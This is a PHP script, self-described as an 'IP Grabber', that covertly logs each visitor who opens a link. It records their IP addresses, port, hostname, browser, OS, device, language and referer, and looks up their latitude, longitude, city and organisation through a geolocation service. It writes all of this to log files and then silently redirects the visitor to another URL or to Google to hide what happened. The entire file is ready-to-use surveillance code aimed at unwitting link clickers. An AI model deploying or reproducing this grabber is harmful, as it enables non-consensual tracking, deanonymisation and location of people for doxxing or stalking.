<?php
 
//IP Grabber made by blankred0 https://github.com/Blankred0

//Variables
$redirection_url = file_get_contents("redirect_url.txt"); // Get the link
$heure_connexion = date("Y-m-d H:i:s");
$protocol = $_SERVER['SERVER_PROTOCOL'];
$ip = $_SERVER['REMOTE_ADDR'];
$ip1 = $_SERVER['HTTP_CLIENT_IP'];
$ip2 = $_SERVER['HTTP_X_FORWARDED_FOR'];
$port = $_SERVER['REMOTE_PORT'];
$agent = $_SERVER['HTTP_USER_AGENT'];
$ref = $_SERVER['HTTP_REFERER'];
$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$screenSize = isset($_SERVER['HTTP_CLIENT_HD']) ? $_SERVER['HTTP_CLIENT_HD'] : 'Not available';
$language = isset($_SERVER['HTTP_ACCEPT_LANGUAGE']) ? $_SERVER['HTTP_ACCEPT_LANGUAGE'] : 'Not available';

$os = 'Unknown';
if (preg_match('/\((.*?)\)/', $agent, $matches)) {
    $os = $matches[1];
}

$browser = 'Unknown';
if (preg_match('/(?:MSIE|Trident\/.*; rv:)(\d+)/', $agent)) {
    $browser = 'Internet Explorer';
} elseif (preg_match('/Firefox\/(\d+)/', $agent)) {
    $browser = 'Firefox';
} elseif (preg_match('/Chrome\/(\d+)/', $agent)) {
    $browser = 'Chrome';
} elseif (preg_match('/Safari\/(\d+)/', $agent)) {
    $browser = 'Safari';
} elseif (preg_match('/Opera\/(\d+)/', $agent)) {
    $browser = 'Opera';
}
$deviceType = 'Unknown';
if (preg_match('/Mobile|Android|iPhone|iPad|iPod/', $agent)) {
    $deviceType = 'Mobile';
} elseif (preg_match('/Tablet|iPad/', $agent)) {
    $deviceType = 'Tablet';
} else {
    $deviceType = 'Desktop';
}


//This part can be modified as you want
$geo_url = "http://ip-api.com/json/" . $ip2;
$geo_data = json_decode(file_get_contents($geo_url), true);
$latitude = $geo_data['lat'];
$longitude = $geo_data['lon'];
$country = $geo_data['country'];
$city = $geo_data['city'];
$org = $geo_data['org'];
$region = $geo_data['regionName'];

//Print IP, Hostname, Port Number, User Agent and Referer To Log.TXT
 
$fh = fopen('../logs/log_advanced.txt', 'a');
fwrite($fh, '[ Connection Time: '."".$heure_connexion ."\n");
fwrite($fh, 'IP Address 0: '."".$ip ."\n");
fwrite($fh, 'IP Address 1:'."".$ip1 ."\n");
fwrite($fh, 'IP Address (IPV4):'."".$ip2 ."\n");
fwrite($fh, 'Hostname: '."".$hostname ."\n");
fwrite($fh, 'Port Number: '."".$port ."\n");
fwrite($fh, 'User Agent: '."".$agent ."\n");
fwrite($fh, 'HTTP Referer: '."".$ref ." \n");
fwrite($fh, 'Screen size: '."".$screenSize ." \n");
fwrite($fh, 'Language: '."".$language ." \n");
fwrite($fh, 'Os: '."".$os ." \n");
fwrite($fh, 'Browser: '."".$browser ." \n");
fwrite($fh, 'DeviceType: '."".$deviceType ." \n");
fwrite($fh, "Latitude : " . $latitude . "\n");
fwrite($fh, "Longitude : " . $longitude . "\n");
fwrite($fh, "Country : " . $country . "\n");
fwrite($fh, "City : " . $geo_data['city'] . "\n");
fwrite($fh, "Organisation : " . $org . "\n");
fwrite($fh, "Region : " . $region . "]\n\n");
fclose($fh);


$fh = fopen('../logs/log.txt', 'a');
fwrite($fh, '[ Connection Time: '."".$heure_connexion ."\n");
fwrite($fh, 'IP Address (IPV4):'."".$ip2 ."\n");
fwrite($fh, "Country : " . $country . "\n");
fwrite($fh, "City : " . $geo_data['city'] . "\n");
fwrite($fh, "Region : " . $region . "]\n\n");
fclose($fh);

if (!empty($redirection_url)) {
    header("Location: " . $redirection_url);
    exit();
} else {
    // If the url is empty redirecting to google :
    header("Location: https://www.google.com");
    exit();
}

?>
